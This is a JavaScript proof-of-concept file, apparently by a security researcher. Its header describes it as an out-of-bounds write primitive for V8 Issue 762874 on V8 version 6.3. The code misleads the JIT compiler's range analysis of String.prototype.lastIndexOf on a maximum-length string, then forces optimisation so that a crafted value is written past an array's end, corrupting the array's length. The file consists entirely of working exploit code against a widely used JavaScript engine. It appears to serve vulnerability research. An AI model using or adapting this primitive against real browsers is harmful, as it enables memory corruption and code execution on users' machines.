/*************************************************************
 * File Name: oldOOBWrite.js
 * 
 * Created on: 2020-03-09 04:44:37
 * Author: raycp
 * 
 * Last Modified: 2020-03-09 06:11:49
 * Description: oob write primitive for Issue 762874, on version 6.3
************************************************************/

const maxLength = 1073741799 //%StringMaxLength();
const s = 'A'.repeat(maxLength);

var oobArray;
function foo(i) {

    let idx  = s.lastIndexOf("", maxLength);
    idx += 25;
    idx = idx >>30;
    let tmp = i & 7;
    idx = idx * tmp;
    let arr = [1.1, 2.2, 3.3, 2.2];
    arr[idx] = 1.74512933848984e-310;
    
    return arr;
}

//foo(1337);  //1337 can also trigger oob read, which is also STANSARD_STORE
foo(1);
%OptimizeFunctionOnNextCall(foo);
oobArray = foo(7);
print(oobArray.length);
